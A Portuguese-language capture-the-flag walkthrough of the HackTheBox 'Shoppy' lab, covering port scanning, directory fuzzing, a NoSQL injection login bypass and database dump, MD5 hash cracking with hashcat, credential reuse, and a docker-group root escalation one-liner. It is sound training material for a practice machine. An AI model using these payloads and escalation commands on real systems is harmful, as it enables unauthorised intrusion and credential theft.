---
title: HackTheBox - Shoppy
author: mithr4nd1r
date: 2022-12-21 11:00:00 -0300
categories: [Walkthrough, HackTheBox]
tags: [writeup, walkthrough, hackthebox, htb, tutorial, hacking, pentest, ctf, capture, flag, linux, facil, easy, shoppy]
mermaid: true
image: https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/Shoppy.png
pin: false
---

Dificuldade | Opini√£o | üìÖ In√≠cio | üìÖ Conclus√£o
:--:|:--:|:--:|:--:
![](/assets/img/nivel/button_facil.png) | ![](/assets/img/nivel/button_medio.png) | 8 de Novembro de 2022 | 21 de Dezembro de 2022

## 1. Escaneamento

```bash
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.18s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http     nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title:             Shoppy Wait Page        
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Tue, 08 Nov 2022 22:13:17 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 16
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 16
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.2952e-05
|     go_gc_duration_seconds{quantile="0.25"} 9.6897e-05
|     go_gc_d
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Tue, 08 Nov 2022 22:13:18 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 16
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 16
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.2952e-05
|     go_gc_duration_seconds{quantile="0.25"} 9.6897e-05
|_    go_gc_d
```

## 2. Enumera√ß√£o

### Web (80)

Ao acessar a p√°gina inicial verificamos um simples sem menus, nem paineis interativos.

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy.png)

Fazendo um fuzzing de diret√≥rios, encontramos uma p√°gina de login.

- `dirsearch -r -u http://shoppy.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e txt,php -f`

```console
07:13:07 root@m1thr4d-r shoppy ‚Üí dirsearch -r -u http://shoppy.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e txt,php -f

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: txt, php | HTTP method: GET | Threads: 30 | Wordlist size: 119996

Output File: /root/.dirsearch/reports/shoppy.htb/_22-11-08_19-20-36.txt

Error Log: /root/.dirsearch/logs/errors-22-11-08_19-20-36.log

Target: http://shoppy.htb/

[19:20:36] Starting: 
[19:20:38] 301 -  179B  - /images  ->  /images/     (Added to queue)
[19:20:38] 302 -   28B  - /admin/  ->  /login
[19:20:38] 302 -   28B  - /admin  ->  /login
[19:20:38] 301 -  171B  - /js  ->  /js/     (Added to queue)
[19:20:38] 301 -  173B  - /css  ->  /css/     (Added to queue)
[19:20:39] 200 -    1KB - /login/     (Added to queue)
[19:20:39] 200 -    1KB - /login
[19:20:40] 301 -  179B  - /assets  ->  /assets/     (Added to queue)
[19:20:41] 302 -   28B  - /Admin  ->  /login
[19:20:41] 302 -   28B  - /Admin/  ->  /login
[19:20:42] 200 -    1KB - /Login
[19:20:42] 200 -    1KB - /Login/     (Added to queue)
[19:20:45] 301 -  177B  - /fonts  ->  /fonts/     (Added to queue)
[19:20:56] 302 -   28B  - /ADMIN  ->  /login
[19:20:56] 302 -   28B  - /ADMIN/  ->  /login
[19:21:13] 301 -  181B  - /exports  ->  /exports/     (Added to queue)
[19:28:49] 200 -    1KB - /LOGIN/     (Added to queue)
[19:28:49] 200 -    1KB - /LOGIN
```

O `fuzzing` de Subdominios deu em nada.
- `wfuzz -c -f sub-fighter -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://shoppy.htb' -H "Host: FUZZ.shoppy.htb" --hw 11`

```console
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================

Total time: 380.8971
Processed Requests: 19966
Filtered Requests: 19966
Requests/sec.: 52.41835
```

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy1.png)

Ao tentar realizar o bypass de login encontrei uma tela de erro

- `' or 1=1-- -`

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy2.png)

Tentei a lista de SQLi Generic do Seclists mas sem sucesso.

Ent√£o parti pra tentativa de NoSQLi: 

[NoSQL injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)

Utilizando como consulta o HackTricks encontramos um par√¢metro que deu certo: `admin' || 1==1%00`

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy3.png)

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy4.png)

Assim, conseguimos o bypass login na aplica√ß√£o

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy5.png)

Ao pesquisar pelo usu√°rio admin retornou dados de credenciais

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy6.png)

```bash
0	
_id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"
```

Depois de algumas tentativas, consegui encontrar uma forma de fazer o dump do banco utilizando o mesmo formato do comando anterior, sem espa√ßos: `/admin/search-users?username='||1==1%00`

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy7.png)

```bash
0	
_id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"
1	
_id	"62db0e93d6d6a999a66ee67b"
username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995"
```

Usando o hashcat e a rockyou o hash do usu√°rio `josh` foi quebrado

- Comando: `hashcat -a 0 -m 0 6ebcea65320589ca4f2f1ce039975995 /usr/share/wordlists/rockyou.txt`

> 6ebcea65320589ca4f2f1ce039975995:`remembermethisway`
{: .prompt-info }
> josh:`remembermethisway`
{: .prompt-info }

## Web (9093) - Log GoLang?

Na porta 9093 existe uma aplica√ß√£o web rodando, que parece ser um monitor de logs.

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy8.png)

Ao procurar pelo plugin `playbook` encontrei o servidor de nome `Mattermost`

[Mattermost](https://github.com/mattermost)

Como s√≥ temos duas portas e os fuzzings n√£o retornaram nada, testei colocar `mattermost` como subdominio, incluindo no arquivo `/etc/hosts`, e assim, conseguimos acesso a uma nova p√°gina de login.

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy9.png)

Utilizando a credencial do josh, conseguimos realizar o login na p√°gina.

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy10.png)

Ao clicar em Deploy Machine, observa-se uma mensagem contendo novas credenciais

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy11.png)

> `jaeger`:`Sh0ppyBest@pp!`
{: .prompt-info }

## 3. Acesso Inicial - Explora√ß√£o

Validamos as credenciais no acesso SSH:

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy12.png)

## 4. P√≥s Explora√ß√£o

Como primeiro ato, como temos a senha do usu√°rio, gosto de verificar as permiss√µes de `sudo` do usu√°rio. E ao verificar, vemos que somente o usu√°rio `deploy` consegue executar um bin√°rio.

- Comando: `sudo -l`

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy13.png)

- Comando: `file /home/deploy/password-manager`

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy14.png)

Tententei passar o usu√°rio no comando sudo diretamente e conseguimos executar o bin√°rio. Por√©m ao passar a senha, foi pedida uma senha mestra.

Ao utilizar o comando cat ou strings no bin√°rio, √© poss√≠vel observar a senha mestra em claro: `Sample`

- Comando: `cat /home/deploy/password-manager`

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy15.png)

Ent√£o aproveitamos, executamos novamente o bin√°rio, passamos a senha mestra e conseguimos as credenciais do usu√°rio `deploy`.

- Comando: `sudo -u deploy /home/deploy/password-manager`

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy16.png)

> Deploy Creds :
> username: deploy
> password: Deploying@pp!
{: .prompt-info }


## 5. Escala√ß√£o de Privil√©gio

Agora que temos as credenciais, mudamos de usu√°rio e rodamos o `linpeas` novamente.

- Comando: `su deploy`

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy17.png)

Ao verificar que estamos no grupo `docker`, podemos tentar montar um container privilegiado passando o diret√≥rio `/` como base. Pra isso, consultamos o GTFOBins:

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy18.png)

Ent√£o executamos o comando abaixo e retornamos com o shell de root.

- Comando: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

![Untitled](https://mithr4nd1r.github.io/assets/img/htb/2022-12-21-writeup-htb-shoppy/shoppy19.png)